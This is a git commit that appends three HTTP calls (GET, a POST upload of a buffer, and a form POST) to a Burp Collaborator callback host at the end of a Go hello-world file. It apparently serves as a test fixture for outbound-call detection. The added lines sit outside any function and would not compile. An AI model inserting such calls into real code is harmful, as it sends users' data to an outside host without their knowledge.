9a325f1903432468dc97e47d94d1ef37b1bcfc99
Aaron James <aaron.c.james@gmail.com>
2022-03-02 17:05:43 -0500

    another commit

--- hello.go
+++ hello.go
@@ -7,3 +7,8 @@ import "rsc.io/quote"
 func main() {
     fmt.Println(quote.Go())
 }
+
+resp, err := http.Get("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/vanilla")
+resp, err := http.Post("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/upload", "image/jpeg", &buf)
+resp, err := http.PostForm("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/form",
+	url.Values{"key": {"Value"}, "id": {"123"}})
